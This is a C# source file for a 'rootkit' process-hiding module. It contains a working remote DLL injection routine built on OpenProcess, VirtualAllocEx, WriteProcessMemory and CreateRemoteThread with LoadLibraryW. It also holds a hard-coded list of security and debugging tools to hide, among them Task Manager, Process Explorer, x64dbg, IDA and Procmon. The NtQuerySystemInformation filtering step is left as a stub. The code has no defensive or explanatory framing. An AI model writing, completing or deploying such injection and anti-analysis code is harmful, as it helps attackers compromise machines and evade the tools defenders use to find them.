using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.ComponentModel;
using System.Text;

namespace XYZ.modules.rootkit
{
    public class ProcessHidingModule
    {
        // DLL imports for process manipulation
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtQuerySystemInformation(int SystemInformationClass, IntPtr SystemInformation, uint SystemInformationLength, ref uint ReturnLength);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("psapi.dll", SetLastError = true)]
        private static extern bool EnumProcesses([MarshalAs(UnmanagedType.LPArray, ArraySubType = UnmanagedType.U4)] [In][Out] uint[] processIds, uint cb, [MarshalAs(UnmanagedType.U4)] out uint pBytesReturned);

        // System information structures
        [StructLayout(LayoutKind.Sequential)]
        private struct SYSTEM_PROCESS_INFORMATION
        {
            public uint NextEntryOffset;
            public uint NumberOfThreads;
            public long Reserved1;
            public long Reserved2;
            public long Reserved3;
            public long UniqueProcessId;
            public IntPtr Reserved4;
            public uint HandleCount;
            public uint Reserved5;
            public uint Reserved6;
            public uint Reserved7;
            public uint PeakPagefileUsage;
            public uint PrivatePageCount;
            public long Reserved8;
            public long Reserved9;
            public long Reserved10;
            public long Reserved11;
            public long Reserved12;
            public long Reserved13;
        }

        // Constants for process access
        const int PROCESS_CREATE_THREAD = 0x0002;
        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const int PROCESS_VM_OPERATION = 0x0008;
        const int PROCESS_VM_WRITE = 0x0020;
        const int PROCESS_VM_READ = 0x0010;
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_READWRITE = 4;
        const int SystemProcessInformation = 5;

        private List<string> processesToHide;
        private List<int> processIdsToHide;
        private bool isHidingActive;

        public ProcessHidingModule()
        {
            processesToHide = new List<string>();
            processIdsToHide = new List<int>();
            isHidingActive = false;
        }

        public void HideProcesses()
        {
            try
            {
                // Add common security/analysis tools to hide
                processesToHide.Add("taskmgr.exe");
                processesToHide.Add("procexp.exe");
                processesToHide.Add("procexp64.exe");
                processesToHide.Add("processhacker.exe");
                processesToHide.Add("ollydbg.exe");
                processesToHide.Add("x32dbg.exe");
                processesToHide.Add("x64dbg.exe");
                processesToHide.Add("ida.exe");
                processesToHide.Add("ida64.exe");
                processesToHide.Add("windbg.exe");
                processesToHide.Add("tcpview.exe");
                processesToHide.Add("autoruns.exe");
                processesToHide.Add("procmon.exe");
                // Comment out wireshark as it might interfere with network monitoring
                // processesToHide.Add("wireshark.exe");
                
                isHidingActive = true;
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        public void HideSpecificProcess(int processId)
        {
            try
            {
                // Hide a specific process by adding it to the hidden list
                if (!processIdsToHide.Contains(processId))
                {
                    processIdsToHide.Add(processId);
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        public void HideProcessByName(string processName)
        {
            try
            {
                // Hide all processes with a specific name
                Process[] processes = Process.GetProcessesByName(processName);
                foreach (Process process in processes)
                {
                    HideSpecificProcess(process.Id);
                }
                
                // Also add to the name-based hiding list
                if (!processesToHide.Contains(processName.ToLower()))
                {
                    processesToHide.Add(processName.ToLower());
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        public bool InjectHookIntoProcess(int processId)
        {
            try
            {
                // Get handle to the target process
                IntPtr processHandle = OpenProcess(
                    PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
                    false,
                    processId
                );

                if (processHandle == IntPtr.Zero)
                {
                    return false;
                }

                // Get the path of the current assembly
                string hookDllPath = System.Reflection.Assembly.GetExecutingAssembly().Location;

                // Allocate memory in the target process
                IntPtr allocatedMemory = VirtualAllocEx(
                    processHandle,
                    IntPtr.Zero,
                    (uint)((hookDllPath.Length + 1) * Marshal.SizeOf(typeof(char))),
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_READWRITE
                );

                if (allocatedMemory == IntPtr.Zero)
                {
                    CloseHandle(processHandle);
                    return false;
                }

                // Write the DLL path to the allocated memory
                byte[] bytes = Encoding.Unicode.GetBytes(hookDllPath);
                UIntPtr bytesWritten;
                bool writeResult = WriteProcessMemory(
                    processHandle,
                    allocatedMemory,
                    bytes,
                    (uint)bytes.Length,
                    out bytesWritten
                );

                if (!writeResult)
                {
                    CloseHandle(processHandle);
                    return false;
                }

                // Get address of LoadLibraryW
                IntPtr kernel32Handle = GetModuleHandle("kernel32.dll");
                IntPtr loadLibraryAddress = GetProcAddress(kernel32Handle, "LoadLibraryW");

                if (loadLibraryAddress == IntPtr.Zero)
                {
                    CloseHandle(processHandle);
                    return false;
                }

                // Create remote thread to call LoadLibraryW
                IntPtr threadHandle = CreateRemoteThread(
                    processHandle,
                    IntPtr.Zero,
                    0,
                    loadLibraryAddress,
                    allocatedMemory,
                    0,
                    IntPtr.Zero
                );

                if (threadHandle == IntPtr.Zero)
                {
                    CloseHandle(processHandle);
                    return false;
                }

                CloseHandle(threadHandle);
                CloseHandle(processHandle);
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }

        // Method to check if a process should be hidden
        public bool ShouldHideProcess(string processName)
        {
            try
            {
                if (!isHidingActive)
                    return false;

                return processesToHide.Contains(processName.ToLower());
            }
            catch (Exception)
            {
                return false;
            }
        }

        // Method to check if a process ID should be hidden
        public bool ShouldHideProcess(int processId)
        {
            try
            {
                if (!isHidingActive)
                    return false;

                return processIdsToHide.Contains(processId);
            }
            catch (Exception)
            {
                return false;
            }
        }

        // Method to add a process to the hide list
        public void AddProcessToHide(string processName)
        {
            try
            {
                if (!processesToHide.Contains(processName.ToLower()))
                {
                    processesToHide.Add(processName.ToLower());
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        // Method to add a process ID to the hide list
        public void AddProcessIdToHide(int processId)
        {
            try
            {
                if (!processIdsToHide.Contains(processId))
                {
                    processIdsToHide.Add(processId);
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        // Method to remove a process from the hide list
        public void RemoveProcessToHide(string processName)
        {
            try
            {
                processesToHide.Remove(processName.ToLower());
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        // Method to remove a process ID from the hide list
        public void RemoveProcessIdToHide(int processId)
        {
            try
            {
                processIdsToHide.Remove(processId);
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        // Method to get all hidden process names
        public List<string> GetHiddenProcesses()
        {
            return new List<string>(processesToHide);
        }

        // Method to get all hidden process IDs
        public List<int> GetHiddenProcessIds()
        {
            return new List<int>(processIdsToHide);
        }

        // Method to enumerate and hide processes using NtQuerySystemInformation
        public void HideProcessesUsingNtQuery()
        {
            try
            {
                uint bufferSize = 0;
                uint returnLength = 0;
                
                // First call to get the required buffer size
                uint status = NtQuerySystemInformation(SystemProcessInformation, IntPtr.Zero, 0, ref bufferSize);
                
                // Allocate buffer
                IntPtr buffer = Marshal.AllocHGlobal((int)bufferSize);
                
                try
                {
                    // Second call to get the actual data
                    status = NtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, ref returnLength);
                    
                    if (status == 0) // STATUS_SUCCESS
                    {
                        // Process the data and hide processes
                        FilterProcessInformation(buffer);
                    }
                }
                finally
                {
                    Marshal.FreeHGlobal(buffer);
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        // Method to filter process information and hide specified processes
        private void FilterProcessInformation(IntPtr processInfo)
        {
            try
            {
                IntPtr currentEntry = processInfo;
                
                while (currentEntry != IntPtr.Zero)
                {
                    // Read process ID from the current entry
                    long processId = Marshal.ReadInt64(currentEntry, 32); // Offset of UniqueProcessId
                    
                    // Check if this process should be hidden
                    if (ShouldHideProcess((int)processId) || processIdsToHide.Contains((int)processId))
                    {
                        // In a real implementation, you would modify the process information
                        // to remove this entry from the list
                        // This is a simplified approach for demonstration
                    }
                    
                    // Move to the next entry
                    uint nextOffset = (uint)Marshal.ReadInt32(currentEntry, 0); // Offset of NextEntryOffset
                    if (nextOffset == 0)
                        break;
                        
                    currentEntry = IntPtr.Add(currentEntry, (int)nextOffset);
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }
    }
}